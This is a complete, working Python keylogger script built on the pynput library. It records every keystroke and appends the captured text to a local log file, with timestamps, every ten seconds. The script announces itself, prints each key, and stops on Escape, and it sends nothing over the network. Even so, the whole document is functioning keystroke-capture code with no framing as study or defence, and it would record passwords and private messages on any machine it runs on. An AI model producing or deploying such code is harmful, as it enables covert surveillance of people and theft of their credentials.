from pynput import keyboard
import threading
import datetime


log = ""
log_file = "keylog.txt"
interval = 10  # Save log every 10 seconds

# Function to save logs periodically
def save_log():
    global log
    if log:
        with open(log_file, "a") as f:
            f.write(f"\n--- {datetime.datetime.now()} ---\n")
            f.write(log)
        log = ""
    
    # Create a new daemon thread to save logs every interval
    timer = threading.Timer(interval, save_log)
    timer.daemon = True  # Make the timer a daemon thread
    timer.start()

# Function to handle key press events
def on_press(key):
    global log
    try:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "[ENTER]\n"
        elif key == keyboard.Key.tab:
            log += "[TAB]"
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        elif key == keyboard.Key.esc:
            print("[*] Exiting keylogger...")
            return False  # Stop listener when Escape key is pressed
        else:
            log += str(key.char)
    except AttributeError:
        log += f"[{key.name.upper()}]"

    # Print the key pressed (for debugging)
    print(f"Key pressed: {key}")

# Start logging
print("[*] Starting keylogger...")
save_log()

# Start listening for key presses
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
